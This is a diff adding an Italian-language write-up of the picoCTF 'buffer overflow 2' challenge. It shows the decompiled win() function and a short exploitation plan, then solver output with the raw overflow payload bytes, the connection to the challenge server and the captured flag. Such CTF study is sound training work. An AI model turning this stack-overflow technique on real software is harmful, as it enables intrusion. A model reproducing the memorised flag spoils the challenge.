@@ -1,0 +1,51 @@
+08049296    char* win(int32_t arg1, int32_t arg2)
+
+08049296    {
+08049296        FILE* fp = fopen("flag.txt", "r");
+08049296        
+080492cc        if (!fp)
+080492cc        {
+08049304            printf("%s %s", "Please create 'flag.txt' in this directory with your", 
+08049304                "own debugging flag.\n");
+080492f3            exit(0);
+080492f3            /* no return */
+080492cc        }
+080492cc        
+08049304        char var_50[0x40];
+08049304        char* result = fgets(&var_50, 0x40, fp);
+08049304        
+0804931c        if (arg1 == 0xcafef00d && arg2 == 0xf00df00d)
+08049325            return printf(&var_50);
+08049325        
+08049337        return result;
+08049296    }
+--------
+
+più o meno è come la challenge precedente solo che ora win si aspetta due argomenti specifici per funzionare.
+
+Per fare ciò dobbiamo quindi
+- riempire il buffer (112B)
+- scrivere l'indirizzo di win
+- scrivere l'indirizzo di ritorno dopo win (che non ci importa molto)
+- scrivere arg1
+- scrivere arg2
+
+
+python3 solve.py                                                                                                                                            ─╯
+[*] '/Users/leonardo/Desktop/git_projects/ctfs/challenges/binexp/picoctf/buffer_overflow_2/vuln'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+[+] Opening connection to saturn.picoctf.net on port 64868: Done
+[*] Switching to interactive mode
+
+\xf0\xfe\xcaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08AAAA
+picoCTF{argum3nt5_4_d4yZ_59cd5643}[*] Got EOF while reading in interactive
+$
+[*] Interrupted
+[*] Closed connection to saturn.picoctf.net port 64868
